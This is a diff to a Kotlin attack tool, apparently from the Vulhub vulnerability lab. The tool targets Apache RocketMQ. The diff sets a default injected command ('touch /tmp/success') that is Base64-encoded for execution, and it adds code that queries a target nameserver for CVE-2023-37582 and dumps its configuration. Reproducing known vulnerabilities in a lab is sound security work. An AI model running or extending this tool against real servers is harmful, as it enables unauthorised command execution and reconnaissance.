@@ -2,12 +2,15 @@ package org.vulhub
 
 import com.github.ajalt.clikt.core.CliktCommand
 import com.github.ajalt.clikt.core.subcommands
+import com.github.ajalt.clikt.parameters.options.default
 import com.github.ajalt.clikt.parameters.options.option
 import com.github.ajalt.clikt.parameters.options.required
 import com.github.ajalt.clikt.parameters.options.help
 import org.apache.rocketmq.tools.admin.DefaultMQAdminExt
+import java.net.InetAddress
 import java.util.Base64
 import java.util.Properties
+import java.util.ArrayList
 
 class RocketMQAttack : CliktCommand(
     name = "rocketmq-attack",
@@ -26,7 +29,7 @@ abstract class BaseAttackCommand(
     
     protected val cmd by option("-c", "--cmd")
         .help("Command to execute")
-        .required()
+        .default("touch /tmp/success")
 
     protected fun getCmd(cmd: String): String {
         val cmdBase = Base64.getEncoder().encodeToString(cmd.toByteArray())
@@ -67,9 +70,19 @@ class AttackNamesrv : BaseAttackCommand(
     help = "Attack RocketMQ nameserver (CVE-2023-37582)"
 ) {
     override fun run() {
-        echo("Attack nameserver $target")
-        // TODO: complete it CVE-2023-37582
-        // https://github.com/Malayke/CVE-2023-37582_EXPLOIT
+        echo("Attack name server $target")
+        val admin = DefaultMQAdminExt()
+        try {
+            admin.start()
+            val nameServerConfig = admin.getNameServerConfig(arrayOf(target).toList())
+            nameServerConfig.forEach { (key, prop) ->
+                prop.forEach { (name, value) ->
+                    echo("$key.$name => $value")
+                }
+            }
+        } finally {
+            admin.shutdown()
+        }
     }
 }
 
